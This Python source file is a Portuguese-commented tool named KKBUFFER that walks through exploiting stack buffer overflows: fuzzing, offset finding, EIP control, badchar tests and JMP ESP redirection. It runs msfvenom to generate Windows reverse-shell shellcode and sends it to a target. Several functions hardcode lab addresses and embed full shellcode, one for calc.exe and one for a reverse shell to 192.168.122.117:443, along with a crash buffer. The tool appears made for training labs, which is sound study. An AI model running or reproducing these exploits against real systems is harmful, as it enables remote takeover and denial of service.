#!/usr/bin/python3
# -*- coding: UTF-8 -*-

# Importa a biblioteca Socket
import socket
# Importa a biblioteca Struct
from struct import pack
import argparse
import subprocess
import time
import random
import itertools
import sys
import os
# Get the current directory
current_directory = os.getcwd()
# Change to the current directory (this is redundant but demonstrates the concept)
# os.chdir(current_directory)


def printbanner():
    help_dependencies="generic_send_tcp, msfvenom"

    # print multiline banner
    print("""
  [1;33m\\\\\\[0;0m ┌─────────────────────┐   [0;44m KK [0;0m[0;45m BUFFER [0;0m
   (o>│[0;1;34;94m╻┏[0m [0;1;34;94m╻┏[0m [0;1;34;94m╺┳╸┏━┓┏━┓╻[0m  [0;34m┏━┓[0m│   [1;97m Author:  Otávio Augusto[0;0m
  _//)│[0;1;34;94m┣┻┓┣┻┓[0m [0;1;34;94m┃[0m [0;34m┃[0m [0;34m┃┃[0m [0;34m┃┃[0m  [0;34m┗━┓[0m│   [1;97m Contact: contact@oaugusto.pro[0;0m
 ///_)│[0;34m╹[0m [0;34m╹╹[0m [0;34m╹[0m [0;34m╹[0m [0;34m┗━┛┗━┛┗[0;37m━╸┗━┛[0m│   [1;97m Website: https://oaugusto.pro[0;0m
//_|_ └─────────────────────┘   [1;97m Social:  @oaugustopro[0;0m

[0;100m ☕version [0;42m 0.1 [0;0m [0;100m ✌license [0;42m MIT [0;0m 
=================[0;0m [1;97mKKBUFFER[0;0m =================[0;0m
Passo a passo para a exploração de uma vulnerabilidade de buffer overflow
    """)
    print("Depends on "+help_dependencies + "\n")

# def step01_fuzzing_brainpan (rhost, rport, nchars ):
#     import socket
#     crash = 1
#     while True:
#         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         client.connect((rhost,int(rport)))
#         print("Tried Offset {0}".format(crash))
#         # Recebe o banner
#         pattern = client.recv(1024)
#         # Envia A para o buffer da aplicação, no socket da mesma
#         client.send(b"A"*crash)
#         # Recebe a resposta da aplicação
#         pattern = client.recv(1024)
#         # Incrementa os chars de nchars em nchars
#         crash+=int(nchars)

def to_little_endian(hex_string):
    # Split into bytes and reverse for little-endian
    bytes_reversed = [hex_string[i:i+2] for i in range(0, len(hex_string), 2)][::-1]
    # Convert to bytes
    return bytes.fromhex(''.join(bytes_reversed))

   
def identify_sequence(host, port, script_file, nr_one, nr_two):
    command = [
    "generic_send_tcp",
    host,
    port,
    script_file,
    nr_one,
    nr_two,
    ]

    # Execute the command and redirect its output to payload.py
    with open("/tmp/kkbuffer-sequence.txt", "w") as file:
        subprocess.run(command, stdout=file)
    # send_enhanced_fuzzed_data_debug(host, int(port), [("s_string", s_string), ("s_string_variable", s_string_variable), ("s_readline", None)], 0, 0)


def test_chars_from_sequence(rhost, rport ,base_cmd, sequence):
    crash = 1
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((rhost,int(rport)))
        # Recebe o banner
        pattern = client.recv(1024)
        base_command = base_cmd.encode()
        # base_command = b"command "
        payload = b"A" * 2000
        # sequence = "/.:/"

        for r in range(1, len(sequence) + 1):  # r is the length of each combination
            for comb in itertools.combinations(sequence, r):
                buffer = base_command + ''.join(comb).encode() + payload
                print("Enviando Buffer")
                print(buffer)
                # Envia A para o buffer da aplicação, no socket da mesma
                client.send(buffer)
                # Recebe a resposta da aplicação
                pattern = client.recv(1024)

def pattern_create(length=8192):
    pattern = ''
    parts = ['A', 'a', '0']
    try:
        if not isinstance(length, int) and length.startswith('0x'):
            length = int(length, 16)
        elif not isinstance(length, int):
            length = int(length)
    except ValueError:
        print_help()
        sys.exit(254)
    while len(pattern) != length:
        pattern += parts[len(pattern) % 3]
        if len(pattern) % 3 == 0:
            parts[2] = chr(ord(parts[2]) + 1)
            if parts[2] > '9':
                parts[2] = '0'
                parts[1] = chr(ord(parts[1]) + 1)
                if parts[1] > 'z':
                    parts[1] = 'a'
                    parts[0] = chr(ord(parts[0]) + 1)
                    if parts[0] > 'Z':
                        parts[0] = 'A'
    # save pattern in a new file in /tmp/pattern.txt
    with open("/tmp/pattern.txt", "w") as f:
        f.write(pattern)
    return pattern

def identify_offset (rhost, rport ,base_cmd):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,int(rport)))
    # Recebe o banner
    pattern = client.recv(1024)
    # Read from the file
    with open("/tmp/pattern.txt", "rb") as f:
        string_from_file = f.read()
    # You can concatenate, slice, or perform any other bytes operation:
    # buffer = b"command ." + string_from_file
    buffer = base_cmd.encode() + string_from_file

    print("Enviando Buffer")
    client.send(buffer)

def pattern_offset(value, length=8192):
    try:
        if not isinstance(value, int) and value.startswith('0x'):
            value = struct.pack('<I', int(value, 16)).decode('utf-8').strip('\x00')
    except ValueError:
        print_help()
        sys.exit(254)
    pattern = pattern_create(length)
    try:
        print(pattern.index(value))
        return pattern.index(value)
    except ValueError:
        return 'Not found'
    
def control_eip (rhost, rport, base_cmd, offset):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,int(rport)))
    # Recebe o banner
    pattern = client.recv(1024)
    eipstring = b"A" * int(offset) + b"BBBB"
    # You can concatenate, slice, or perform any other bytes operation:
    buffer = base_cmd.encode() + eipstring
    print("Enviando Buffer")
    client.send(buffer)

def badchars (rhost, rport, base_cmd, offset):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,int(rport)))
    # Recebe o banner
    pattern = client.recv(1024)
    # verifica se o address cai no EIP e quantos NOPs vai precisar
    
    eipstring = b"A" * int(offset) + b"BBBB"
    # badchars
    badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    # You can concatenate, slice, or perform any other bytes operation:
    buffer = base_cmd.encode() + eipstring + badchars
    print("Enviando Buffer")
    client.send(buffer)   

def nops_jump_esp (rhost, rport, base_cmd, offset, hex_string):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,int(rport)))
    # Recebe o banner
    pattern = client.recv(1024)
    address = to_little_endian(hex_string)
    # verifica se o address cai no EIP e quantos NOPs vai precisar
    
    eipstring = b"A" * int(offset) + address + b"A" * 10 + b"B" * 10 + b"C" * 10 + b"D" * 10
    # You can concatenate, slice, or perform any other bytes operation:
    buffer = base_cmd.encode() + eipstring
    print("Enviando Buffer")
    client.send(buffer)

# Execute a system command msfvenon to create a payload and save it on /tmp/.payload. "\\x00",
def generate_payload(host,port,bad_chars):
    command = [
    "msfvenom", 
    "-p", "windows/shell_reverse_tcp",
    "LHOST="+host,
    "LPORT="+port,
    "-b", bad_chars,
    "-f", "python",
    "-v", "payload",
    "EXITFUNC=thread"
    ]

    # Execute the command and redirect its output to payload.py
    with open("/tmp/payload.py", "w") as file:
        subprocess.run(command, stdout=file)

def insert_payload (rhost, rport, base_cmd, offset, hex_string, nops):
    import sys
    sys.path.append('/tmp')
    from payload import payload
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((rhost,int(rport)))
    # Recebe o banner
    pattern = client.recv(1024)
    address = to_little_endian(hex_string)
    eipstring = b"A" * int(offset) + address + b"\x90" * int(nops)
    
    # You can concatenate, slice, or perform any other bytes operation:
    buffer = base_cmd.encode() + eipstring + payload
    print("Enviando Buffer")
    client.send(buffer)

def fuzzing_manual2 (rhost, rport, nchars):
    # Cria a conexão com a máquina e se conecta
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((str(rhost),int(rport)))
    # Envia um buffer de 600 "A"
    buffer = b"A" * int(nchars)
    print("[+] Enviando Buffer de " + str(nchars) + " [+]")
    client.send(buffer)

def fuzzing_pattern ():
    # Cria a conexão com a máquina e se conecta
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.122.49',9999))
    # Envia um buffer de 600 "A"
    buffer = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
    print("[+] Enviando Buffer de 600 [+]")
    client.send(buffer)

def fuzzing03 ():
    # Cria a conexão com a máquina e se conecta
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.122.49',9999))
    # Envia um buffer de 524 "A" e 4 "B"
    buffer = b"A" * 524
    buffer += b"B" * 4
    buffer += b"C" * 500
    print("[+] Enviando Buffer de 524 'A' e 4 'B' [+]")
    client.send(buffer)

def step04 ():
    # Cria a conexão com a máquina e se conecta
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.122.49',9999))
    # Envia um buffer de 524 "A", 4 "B" e 500 "C"
    buffer = b"A" * 524
    buffer += b"B" * 4
    buffer += b"C" * 500
    print("[+] Enviando Buffer de 524 'A' e 4 'B' [+]")
    client.send(buffer)

def func05 ():
    # Cria a conexão com a máquina e se conecta
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.122.49',9999))
    # Envia um buffer de 524 "A", 4 "B" e 500 "C"
    buffer = b"A" * 524

    buffer += pack('<I', 0x311712f3) # JMP ESP

    buffer += b"C" * 500
    print("[+] Enviando Buffer de 524 'A', JMP ESP e 500 'C' [+]")
    client.send(buffer)

def func06 ():
    # Cria a conexão com a máquina e se conecta
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.122.49',9999))
    # Envia um buffer de 524 "A", 4 "B" e 500 "C"

    badchars = (
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
    buffer = b"A" * 524
    buffer += pack('<I', 0x311712f3) # JMP ESP
    buffer += b"\x90" * 10
    buffer += badchars

    print("[+] Enviando Buffer de 524 'A', JMP ESP e 500 'C' [+]")
    client.send(buffer)

def func07 ():
    # Cria a conexão com a máquina e se conecta
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.122.49',9999))

    # msfvenom -p windows/exec cmd=calc.exe -b "\x00" -f python -v payload EXITFUNC=thread
    payload =  b""
    payload += b"\xda\xcb\xb8\xa4\x40\xee\x4f\xd9\x74\x24\xf4"
    payload += b"\x5b\x33\xc9\xb1\x31\x31\x43\x18\x83\xeb\xfc"
    payload += b"\x03\x43\xb0\xa2\x1b\xb3\x50\xa0\xe4\x4c\xa0"
    payload += b"\xc5\x6d\xa9\x91\xc5\x0a\xb9\x81\xf5\x59\xef"
    payload += b"\x2d\x7d\x0f\x04\xa6\xf3\x98\x2b\x0f\xb9\xfe"
    payload += b"\x02\x90\x92\xc3\x05\x12\xe9\x17\xe6\x2b\x22"
    payload += b"\x6a\xe7\x6c\x5f\x87\xb5\x25\x2b\x3a\x2a\x42"
    payload += b"\x61\x87\xc1\x18\x67\x8f\x36\xe8\x86\xbe\xe8"
    payload += b"\x63\xd1\x60\x0a\xa0\x69\x29\x14\xa5\x54\xe3"
    payload += b"\xaf\x1d\x22\xf2\x79\x6c\xcb\x59\x44\x41\x3e"
    payload += b"\xa3\x80\x65\xa1\xd6\xf8\x96\x5c\xe1\x3e\xe5"
    payload += b"\xba\x64\xa5\x4d\x48\xde\x01\x6c\x9d\xb9\xc2"
    payload += b"\x62\x6a\xcd\x8d\x66\x6d\x02\xa6\x92\xe6\xa5"
    payload += b"\x69\x13\xbc\x81\xad\x78\x66\xab\xf4\x24\xc9"
    payload += b"\xd4\xe7\x87\xb6\x70\x63\x25\xa2\x08\x2e\x23"
    payload += b"\x35\x9e\x54\x01\x35\xa0\x56\x35\x5e\x91\xdd"
    payload += b"\xda\x19\x2e\x34\x9f\xc6\xcc\x9d\xd5\x6e\x49"
    payload += b"\x74\x54\xf3\x6a\xa2\x9a\x0a\xe9\x47\x62\xe9"
    payload += b"\xf1\x2d\x67\xb5\xb5\xde\x15\xa6\x53\xe1\x8a"
    payload += b"\xc7\x71\x82\x4d\x54\x19\x6b\xe8\xdc\xb8\x73"

    buffer = b"A" * 524
    buffer += pack('<I', 0x311712f3) # JMP ESP
    buffer += b"\x90" * 10
    buffer += payload

    print("[+] Enviando PoC do calc.exe [+]")
    client.send(buffer)

def func08 ():
    # Cria a conexão com a máquina e se conecta
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.122.49',9999))

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.117 LPORT=443 -b "\x00" -f python -v payload EXITFUNC=thread
    payload =  b""
    payload += b"\xd9\xf7\xbd\xc2\xa2\xd9\xc3\xd9\x74\x24\xf4"
    payload += b"\x5a\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x6a\x13"
    payload += b"\x03\xa8\xb1\x3b\x36\xd0\x5e\x39\xb9\x28\x9f"
    payload += b"\x5e\x33\xcd\xae\x5e\x27\x86\x81\x6e\x23\xca"
    payload += b"\x2d\x04\x61\xfe\xa6\x68\xae\xf1\x0f\xc6\x88"
    payload += b"\x3c\x8f\x7b\xe8\x5f\x13\x86\x3d\xbf\x2a\x49"
    payload += b"\x30\xbe\x6b\xb4\xb9\x92\x24\xb2\x6c\x02\x40"
    payload += b"\x8e\xac\xa9\x1a\x1e\xb5\x4e\xea\x21\x94\xc1"
    payload += b"\x60\x78\x36\xe0\xa5\xf0\x7f\xfa\xaa\x3d\xc9"
    payload += b"\x71\x18\xc9\xc8\x53\x50\x32\x66\x9a\x5c\xc1"
    payload += b"\x76\xdb\x5b\x3a\x0d\x15\x98\xc7\x16\xe2\xe2"
    payload += b"\x13\x92\xf0\x45\xd7\x04\xdc\x74\x34\xd2\x97"
    payload += b"\x7b\xf1\x90\xff\x9f\x04\x74\x74\x9b\x8d\x7b"
    payload += b"\x5a\x2d\xd5\x5f\x7e\x75\x8d\xfe\x27\xd3\x60"
    payload += b"\xfe\x37\xbc\xdd\x5a\x3c\x51\x09\xd7\x1f\x3e"
    payload += b"\xfe\xda\x9f\xbe\x68\x6c\xec\x8c\x37\xc6\x7a"
    payload += b"\xbd\xb0\xc0\x7d\xc2\xea\xb5\x11\x3d\x15\xc6"
    payload += b"\x38\xfa\x41\x96\x52\x2b\xea\x7d\xa2\xd4\x3f"
    payload += b"\xd1\xf2\x7a\x90\x92\xa2\x3a\x40\x7b\xa8\xb4"
    payload += b"\xbf\x9b\xd3\x1e\xa8\x36\x2e\xc9\x17\x6e\x4a"
    payload += b"\x7c\xf0\x6d\xaa\x7f\xbb\xfb\x4c\x15\xab\xad"
    payload += b"\xc7\x82\x52\xf4\x93\x33\x9a\x22\xde\x74\x10"
    payload += b"\xc1\x1f\x3a\xd1\xac\x33\xab\x11\xfb\x69\x7a"
    payload += b"\x2d\xd1\x05\xe0\xbc\xbe\xd5\x6f\xdd\x68\x82"
    payload += b"\x38\x13\x61\x46\xd5\x0a\xdb\x74\x24\xca\x24"
    payload += b"\x3c\xf3\x2f\xaa\xbd\x76\x0b\x88\xad\x4e\x94"
    payload += b"\x94\x99\x1e\xc3\x42\x77\xd9\xbd\x24\x21\xb3"
    payload += b"\x12\xef\xa5\x42\x59\x30\xb3\x4a\xb4\xc6\x5b"
    payload += b"\xfa\x61\x9f\x64\x33\xe6\x17\x1d\x29\x96\xd8"
    payload += b"\xf4\xe9\xb6\x3a\xdc\x07\x5f\xe3\xb5\xa5\x02"
    payload += b"\x14\x60\xe9\x3a\x97\x80\x92\xb8\x87\xe1\x97"
    payload += b"\x85\x0f\x1a\xea\x96\xe5\x1c\x59\x96\x2f"


    buffer = b"A" * 524
    buffer += pack('<I', 0x311712f3) # JMP ESP
    buffer += b"\x90" * 10
    buffer += payload

    print("[+] Enviando PoC do shell reverso [+]")
    client.send(buffer)

def fuzzerexec2 ():
    size = 100
    while(size < 2000):
        try:
            print("\nSending buffer size of %s bytes" % size)
            buffer = "A" * size + "\n"
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect(("192.168.122.49", 31337))
            s.send(buffer)
            
            s.close()

            size +=100
            time.sleep(3)
        except:
            print("\nCould not connect!")
            sys.exit()

def dosstackbuffer01 ():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(('192.168.122.49',31337))

    buffer = b"A" * 300 + b"\n"

    print("[+] Enviando buffer de 300 Bytes [+]")

    client.send(buffer)
    
def get_interactive_args(arg_prompts):
    """Get arguments from the user interactively."""
    return [input(prompt) for prompt in arg_prompts]

def select_function_interactively(functions):
    """Display the functions and let the user select one."""
    for key, value in functions.items():
        print(f"{key}. {value['func'].__name__}")
    choice = input("Enter the number of the function to execute: ")
    if choice == '' :
        choice=-1
    try:
        return int(choice)
    except ValueError:
        print("Invalid input. Please enter a number.")

def exit_program():
    sys.exit(0)

def execute_function():
    try:
        # A dictionary mapping numbers to functions and the number of arguments they expect
        will_not_stop=True
        while will_not_stop == True:
            print("Digite uma opção"+str(will_not_stop))
            functions = {
                0: {"func": exit_program, "arg_prompts":''},
                1: {"func": identify_sequence, "arg_prompts": ["rhost: ","rport: ","script_file: ","nr_one: ","nr_two: "]},
                2: {"func": test_chars_from_sequence, "arg_prompts": ["rhost: ","rport: ","base_cmd: ","sequence: "]},
                3: {"func": pattern_create, "arg_prompts": ["length: "]},
                4: {"func": identify_offset, "arg_prompts": ["rhost: ","rport: ","base_cmd: "]},
                5: {"func": pattern_offset, "arg_prompts": ["value: ","length: "]},
                6: {"func": control_eip, "arg_prompts": ["rhost: ","rport: ","base_cmd: ","offset: "]},
                7: {"func": badchars, "arg_prompts": ["rhost: ","rport: ","base_cmd: ","offset: "]},
                8: {"func": nops_jump_esp, "arg_prompts": ["rhost: ","rport: ","base_cmd: ","offset: ","hex_string: "]},
                9: {"func": generate_payload, "arg_prompts": ["rhost: ","rport: ","bad_chars: "]},
                10: {"func": insert_payload, "arg_prompts": ["rhost: ","rport: ","base_cmd: ","offset: ","hex_string: ","nops: "]},
            }

            parser = argparse.ArgumentParser(description="Execute a function with command line arguments.")
            parser.add_argument("-f", "--function", help="Number of the function to execute", required=False)
            parser.add_argument("-args", "--arguments", nargs='*', help="Arguments for the function", required=False)

            args = parser.parse_args()

            # If function not provided, ask for it interactively
            if args.function is None:
                function_choice = select_function_interactively(functions)
            else:
                will_not_stop=False
                function_choice = int(args.function)

            # check if the function_choice is integer
            if function_choice in functions:
                func_data = functions[function_choice]
                
                # Check if arguments were provided via command line
                if args.arguments:
                    provided_args = args.arguments
                else:
                    provided_args = get_interactive_args(func_data["arg_prompts"])
                
                func_data["func"](*provided_args)
            else:
                print("Invalid function number!")
    except KeyboardInterrupt:
        print("\nUser interrupted execution. Exiting...")
        sys.exit(0)

if __name__ == "__main__":
    printbanner()
    execute_function()